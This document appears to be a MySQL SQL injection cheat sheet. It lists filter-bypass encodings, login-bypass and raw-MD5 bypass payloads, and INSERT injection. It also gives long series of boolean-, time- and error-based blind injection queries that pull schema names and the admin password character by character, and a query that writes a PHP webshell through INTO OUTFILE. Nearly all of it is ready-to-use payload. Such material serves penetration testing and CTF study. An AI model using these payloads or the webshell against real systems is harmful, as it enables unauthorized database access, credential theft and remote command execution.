# MySQL

## # Filter Bypass

### White Space

* /\*\*/&#x20;
* ()
* \+
* \t = %09&#x20;
* \n = %0a

### Comment

* \--
* \#
* /\*\*/

### admin

* reverse("nimda")
* 0x61646d696e
* char(97, 100, 109, 105, 110)
* 0b0110000101100100011011010110100101101110

### equal (=)&#x20;

* LIKE
* IN
* REGEXP
* RLIKE
* SOUNDS LIKE

### and, or, not

* ||
* &&
* %26%26 (&&)
* %7c%7c (||)&#x20;
* !

### misc

* CURRENT\_USER() <=> CURRENT\_USER
*

## # SELECT

```sql
SELECT * FROM users WHERE username='{username}' AND password='{password}';
```

### Payload

```sql
# username = admin'#
SELECT * FROM users WHERE username='admin'# AND password='{password}';

# username = admin
# password = '='
SELECT * FROM users WHERE username='admin' AND password=''='';

# username = Admin'#
# username = Admin'--
SELECT * FROM users WHERE username='Admin'# AND password='{password}';
SELECT * FROM users WHERE username='Admin'-- AND password='{password}';

# username = ' UNION SELECT * FROM users WHERE username LIKE reverse("nimda");#
SELECT * FROM users WHERE username='' UNION SELECT * FROM users WHERE username LIKE reverse("nimda");#' AND password='{password
# username = '/**/or/**/username=0x61646d696e;#
SELECT * FROM users WHERE username=''/**/or/**/username=0x61646d696e;#AND password='{password}';
# username = '/**/or/**/username=0b0110000101100100011011010110100101101110;#
SELECT * FROM users WHERE username=''/**/or/**/username=0b0110000101100100011011010110100101101110;#AND password='{password}';
# username = '/**/or/**/username=char(97,100,109,105,110);#
SELECT * FROM users WHERE username=''/**/or/**/username=char(97,100,109,105,110);#AND password='{password}';
```

## # MD5 Hash Bypass

```sql
SELECT * FROM users WHERE username='{$_GET['username']}' AND password=md5('{$_GET['password']}');
```

### Payload

```sql
# username = '/*' and password=md5('*/UNION/**/SELECT/**/AND/**/username='admin';#
SELECT * FROM users WHERE username=''/*' and password=md5('*/UNION/**/SELECT/**/AND/**/username='admin';#{$_GET['password']}');

SELECT * FROM users WHERE username=''/**/UNION/**/SELECT/**/AND/**/username='admin';#{$_GET['password']}');
```

## # [Raw MD5 Hash (not Hex)](https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)&#x20;

<pre class="language-sql"><code class="lang-sql"><strong>SELECT * FROM users WHERE username='{$_GET['username']}' AND password='{md5($_GET['password'], true)}';
</strong></code></pre>

### Payload

```sql
# username = admin
# password = 129581926211651571912466741651878684928

# content: 129581926211651571912466741651878684928
# count:   18933549
# hex:     06da5430449f8f6f23dfc1276f722738
# raw:     ?T0D??o#??'or'8.N=?

SELECT * FROM users WHERE username='admin' AND password='?T0D??o#??'or'8.N=?';

SELECT * FROM users WHERE username='admin' AND password='?T0D??o#??'or 1;

SELECT * FROM users WHERE username='admin' AND True;
```

## # INSERT

```sql
INSERT INTO chall8(agent,ip,id) VALUES ('{$agent}','{$ip}','guest');
```

### Payload

```sql
# agent = A','1.1.1.1','admin'),('B
INSERT INTO chall8(agent,ip,id) VALUES ('A','1.1.1.1','admin'),('B','{$ip}','guest');
```

## # Boolean based Blind SQL Injection

```sql
SELECT * FROM users WHERE idx='{idx}';
```

### Payload

<pre class="language-sql"><code class="lang-sql"># /?idx=' or '1'='1 (True)
SELECT * FROM users WHERE idx='' or '1'='1';
# /?idx=' or '1'='2 (False)
SELECT * FROM users WHERE idx='' or '1'='2';

# /?idx=' or if(length(username)={},true,false);#
SELECT * FROM users WHERE idx='' or if(length(username)=1,true,false);#'; (False)
SELECT * FROM users WHERE idx='' or if(length(username)=2,true,false);#'; (False)
SELECT * FROM users WHERE idx='' or if(length(username)=3,true,false);#'; (False)
SELECT * FROM users WHERE idx='' or if(length(username)=4,true,false);#'; (True)
SELECT * FROM users WHERE idx='' or if(length(username)=5,true,false);#'; (False)
SELECT * FROM users WHERE idx='' or if(length(username)=6,true,false);#'; (False)
...

# /?idx=' or if(length(database())like({}),1,0);#
SELECT * FROM users WHERE idx='' or if(length(database())like(1),1,0);#'; (False)
SELECT * FROM users WHERE idx='' or if(length(database())like(2),1,0);#'; (False)
SELECT * FROM users WHERE idx='' or if(length(database())like(3),1,0);#'; (False)
SELECT * FROM users WHERE idx='' or if(length(database())like(4),1,0);#'; (False)
SELECT * FROM users WHERE idx='' or if(length(database())like(5),1,0);#'; (False)
SELECT * FROM users WHERE idx='' or if(length(database())like(6),1,0);#'; (True)

# DATABASE, TABLE, COLUMN
# /?idx=' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),{},1))in({})
# first: idx of characters, second: ascii number 
SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),1,1))in(32);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),1,1))in(33);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),1,1))in(34);#';
...
<strong>SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),1,1))in(125);#';
</strong>SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),1,1))in(126);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),1,1))in(127);#';

# next idx 
SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),2,1))in(32);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),2,1))in(33);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),2,1))in(34);#';
...
SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),2,1))in(125);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),2,1))in(126);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(min(concat(table_schema,00,table_name,00,column_name)))from(information_schema.columns)),2,1))in(127);#';


# /?idx=' or ord(substr((select(max(real_column_name))from(real_table_name)),{},1))in({})
SELECT * FROM users WHERE idx='' or ord(substr((select(max(real_column_name))from(real_table_name)),1,1))in(32);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(max(real_column_name))from(real_table_name)),1,1))in(33);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(max(real_column_name))from(real_table_name)),1,1))in(33);#';
...
SELECT * FROM users WHERE idx='' or ord(substr((select(max(real_column_name))from(real_table_name)),1,1))in(125);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(max(real_column_name))from(real_table_name)),1,1))in(126);#';
SELECT * FROM users WHERE idx='' or ord(substr((select(max(real_column_name))from(real_table_name)),1,1))in(127);#';

</code></pre>

## # Time based Blind SQL Injection

```sql
SELECT * FROM users WHERE idx='{idx}';
```

### Payload

<pre class="language-sql"><code class="lang-sql"># /?idx=' or sleep(3);#
SELECT * FROM users WHERE idx='' or sleep(3);#';

# /?idx=' or if(ascii(substr(username,{},1))={},sleep(3),0);#
# first idx
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=32,sleep(3),0);#';
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=33,sleep(3),0);#';
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=34,sleep(3),0);#';
...
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=125,sleep(3),0);#';
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=126,sleep(3),0);#';
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,1,1))=127,sleep(3),0);#';

# second idx 
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=32,sleep(3),0);#';
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=33,sleep(3),0);#';
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=34,sleep(3),0);#';
...
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=125,sleep(3),0);#';
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=126,sleep(3),0);#';
SELECT * FROM users WHERE idx='' or if(ascii(substr(username,2,1))=127,sleep(3),0);#';
...


# Heavy SELECT Table 
<strong># /?idx=1',(SELECT 1 FROM users WHERE username='admin' AND IF(length(password)={}, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16),1)));#
</strong>SELECT * FROM users WHERE idx='1',(SELECT 1 FROM users WHERE username='admin' AND IF(length(password)=1, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16),1)));#'; (False)
SELECT * FROM users WHERE idx='1',(SELECT 1 FROM users WHERE username='admin' AND IF(length(password)=2, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16),1)));#'; (False)
SELECT * FROM users WHERE idx='1',(SELECT 1 FROM users WHERE username='admin' AND IF(length(password)=3, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16),1)));#'; (False)
...
SELECT * FROM users WHERE idx='1',(SELECT 1 FROM users WHERE username='admin' AND IF(length(password)=14, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16),1)));#'; (False)
SELECT * FROM users WHERE idx='1',(SELECT 1 FROM users WHERE username='admin' AND IF(length(password)=15, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16),1)));#'; (True)

# /?idx=1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, {}, 1))={}, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 1, 1))=32, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 1, 1))=33, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 1, 1))=34, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 1, 1))=35, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
...
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 1, 1))=125, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 1, 1))=126, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 1, 1))=127, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)

# second idx 
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 2, 1))=32, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 2, 1))=33, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 2, 1))=34, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 2, 1))=35, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
...
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 2, 1))=125, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 2, 1))=126, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 2, 1))=127, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)

...

# last idx 
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 15, 1))=32, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 15, 1))=33, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 15, 1))=34, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 15, 1))=35, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
...
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 15, 1))=125, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 15, 1))=126, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)
SELECT * FROM users WHERE idx='1', (SELECT 1 FROM users WHERE username='admin' AND IF(ascii(substr(password, 15, 1))=127, (SELECT MAX(1) FROM users u1, users u2, users u3, users u4, users u5, users u6, users u7, users u8, users u9, users u10, users u11, users u12, users u13, users u14, users u15, users u16), 1)))#'; (False)

</code></pre>

## # WebShell

If --secure-file-priv option is set, it is difficult to execute the webshell. Because we can only generate a file in /var/lib/mysql-files.

```sql
mysql> SELECT @@GLOBAL.secure_file_priv;
+---------------------------+
| @@GLOBAL.secure_file_priv |
+---------------------------+
| /var/lib/mysql-files/     |
+---------------------------+
1 row in set (0.00 sec)
```

If --secure-file-priv is set as /var and an account has write permission in the directory, we can attempt a webshell upload.

```sql
mysql> SELECT @@GLOBAL.secure_file_priv;
+---------------------------+
| @@GLOBAL.secure_file_priv |
+---------------------------+
| /var/                     |
+---------------------------+
1 row in set (0.00 sec)

mysql> SELECT "<?php system($_GET['cmd']) ?>" INTO OUTFILE "/var/www/html/webshell.php";
Query OK, 1 row affected (0.00 sec)
```





## # Error based Blind SQL Injection&#x20;

```sql
SELECT * FROM users WHERE idx='{idx}';
```

### Payload

```sql
# /?idx=' UNION SELECT extractvalue(1,concat(0x3a,version()));#
SELECT * FROM users WHERE idx='' UNION SELECT extractvalue(1,concat(0x3a,version()));#';

# /?idx=' UNION SELECT extractvalue(1,concat(0x3a,(SELECT password FROM user WHERE username='admin')));#
SELECT * FROM users WHERE idx='' UNION SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));#';

# /?idx=' UNION SELECT extractvalue(1,concat(0x3a,(SELECT substr(password,{},10) FROM users WHERE username='admin')));#
SELECT * FROM users WHERE idx='' UNION SELECT extractvalue(1,concat(0x3a,(SELECT substr(password,1,10) FROM users WHERE username='admin')));#';
SELECT * FROM users WHERE idx='' UNION SELECT extractvalue(1,concat(0x3a,(SELECT substr(password,11,10) FROM users WHERE username='admin')));#';
SELECT * FROM users WHERE idx='' UNION SELECT extractvalue(1,concat(0x3a,(SELECT substr(password,21,10) FROM users WHERE username='admin')));#';
...

```
